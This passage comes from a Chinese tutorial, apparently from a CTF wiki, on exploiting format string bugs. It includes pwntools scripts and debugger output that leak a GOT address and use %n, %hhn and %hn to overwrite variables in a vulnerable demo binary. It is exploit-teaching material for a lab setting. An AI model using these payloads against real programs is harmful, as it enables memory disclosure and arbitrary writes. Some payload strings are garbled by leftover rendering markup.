</svg>eax<br>0xffffcd24│+0x18: 0xffffce00  →  0x00000000<br>0xffffcd28│+0x1c: 0x000000e0<br>───────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd20 <span class="hljs-string">&quot;%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or &quot;print&quot;.<br>gef➤  x/x 0xffffcd20<br>0xffffcd20:	0x73243425<br>gef➤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gef➤  x/x 0x73243425<br>0x73243425:	Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure>

<p>显然0xffffcd20处所对应的格式化字符串所对应的变量值0x73243425并不能够被改程序访问，所以程序就自然崩溃了。</p>
<p>那么如果我们设置一个可访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p>
<p>首先，获取scanf@got的地址，如下</p>
<blockquote>
<p>这里之所以没有使用printf函数，是因为scanf函数会对0a，0b，0c，00等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure>

<p>下面我们利用pwntools构造payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got</span><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>

<p>其中，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(记得下断点)，可以看到我们的第四个参数确实指向我们的scanf的地址，这里输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"> → <span class="hljs-number">0xf7615670</span> &lt;printf+<span class="hljs-number">0</span>&gt;       call   <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">0</span>&gt; mov    eax, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb0c</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">3</span>&gt; ret<br>      <span class="hljs-number">0xf76ebb0d</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">0</span>&gt; mov    edx, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb10</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">3</span>&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[<span class="hljs-string">&#x27;0xffbbf8dc&#x27;</span>, <span class="hljs-string">&#x27;l8&#x27;</span>]<br><span class="hljs-number">8</span><br><span class="hljs-number">0xffbbf8dc</span>│+<span class="hljs-number">0x00</span>: <span class="hljs-number">0x080484ce</span>  →  &lt;main+<span class="hljs-number">99</span>&gt; add esp, <span class="hljs-number">0x10</span>	 ← $esp<br><span class="hljs-number">0xffbbf8e0</span>│+<span class="hljs-number">0x04</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e4</span>│+<span class="hljs-number">0x08</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e8</span>│+<span class="hljs-number">0x0c</span>: <span class="hljs-number">0x000000c2</span><br><span class="hljs-number">0xffbbf8ec</span>│+<span class="hljs-number">0x10</span>: <span class="hljs-number">0xf765c6bb</span>  →  &lt;handle_intel+<span class="hljs-number">107</span>&gt; add esp, <span class="hljs-number">0x10</span><br><span class="hljs-number">0xffbbf8f0</span>│+<span class="hljs-number">0x14</span>: <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp	 ← $eax<br><span class="hljs-number">0xffbbf8f4</span>│+<span class="hljs-number">0x18</span>: <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-number">0xffbbf8f8</span>│+<span class="hljs-number">0x1c</span>: <span class="hljs-number">0x00000000</span><br><br></code></pre></td></tr></table></figure>

<p>同时，在我们运行的terminal下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  leakmemory git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./leakmemory&#x27;</span>: pid <span class="hljs-number">65363</span><br>[*] <span class="hljs-string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;</span><br>    Arch:     i386-<span class="hljs-number">32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)<br><span class="hljs-number">0x804a014</span><br>\x14\xa0\x80%<span class="hljs-number">4</span>$s<br>[*] running <span class="hljs-keyword">in</span> new terminal: /usr/<span class="hljs-built_in">bin</span>/gdb -q  <span class="hljs-string">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot;</span> <span class="hljs-number">65363</span><br>[+] Waiting <span class="hljs-keyword">for</span> debugger: Done<br><span class="hljs-number">0xf76280c0</span><br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./leakmemory&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">65363</span>)<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactiv<br></code></pre></td></tr></table></figure>

<p>我们确实得到了scanf的地址。</p>
<p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[padding][addr]<br></code></pre></td></tr></table></figure>

<p>注意</p>
<blockquote>
<p>我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;\x0c\xa0\x04\x08%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14│+0x18: &quot;\xa0\x04\x08%4$s&quot;<br>0xffffcd18│+0x1c: &quot;\x04\x08%4$s&quot;<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd10 <span class="hljs-string">&quot;\\x0c\\xa0\\x04\\x08%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  x/x 0xffffcd10<br>0xffffcd10:	0x6330785c<br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢?答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<br></code></pre></td></tr></table></figure>

<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p>
<p>这里我们给出如下的程序来介绍相应的部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>makefile在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure>

<p>其中…表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><h4 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h4><p>首先，我们自然是来想办法知道栈变量c的地址。由于目前几乎上所有的程序都开启了aslr保护，所以栈的地址一直在变，所以我们这里故意输出了c变量的地址。</p>
<h4 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h4><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;<br>0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000<br>0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28│+0x1c: &quot;%d%d&quot;	 ← $eax<br></code></pre></td></tr></table></figure>

<p>我们可以发现在0xffffcd14处存储着变量c的数值。继而，我们再确定格式化字符串’%d%d’的地址0xffffcd28相对于printf函数的格式化字符串参数0xffffcd10的偏移为0x18，即格式化字符串相当于printf函数的第7个参数，相当于格式化字符串的第6个参数。</p>
<h4 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h4><p>这样，第6个参数处的值就是存储变量c的地址，我们便可以利用%n的特征来修改c的值。payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[addr of c]%012d%6$n<br></code></pre></td></tr></table></figure>

<p>addr of c 的长度为4，故而我们得再输入12个字符才可以达到16个字符，以便于来修改c的值为16。</p>
<p>具体脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forc</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>    payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-comment">#gdb.attach(sh)</span><br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>܌��%012d%6$n<br>܌��-00000160648modified c.<br></code></pre></td></tr></table></figure>

<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以2为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个(4或8)字节。显然，无论之后如何输出，都只会比4大。</p>
<blockquote>
<p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
</blockquote>
<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把tag放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第6个参数。由于我们想要把2写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">aa%k$nxx<br></code></pre></td></tr></table></figure>

<p>此时对应的存储的格式化字符串已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p>
<p>利用ida可以得到a的地址为0x0804A024（由于a、b是已初始化的全局变量，因此不在堆栈中）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure>

<p>故而我们可以构造如下的利用代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fora</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    a_addr = <span class="hljs-number">0x0804A024</span><br>    payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>对应的结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta">aaaa$</span><span class="bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure>

<p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p>
<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text"> <br> hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<br></code></pre></td></tr></table></figure>

<p>所以说，我们可以利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节。这里，我们以单字节为例。</p>
<p>首先，我们还是要确定的是要覆盖的地址为多少，利用ida看一下，可以发现地址为0x0804A028。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure>

<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure>

<p>首先，由于我们的字符串的偏移为6，所以我们可以确定我们的payload基本是这个样子的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad2+'%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
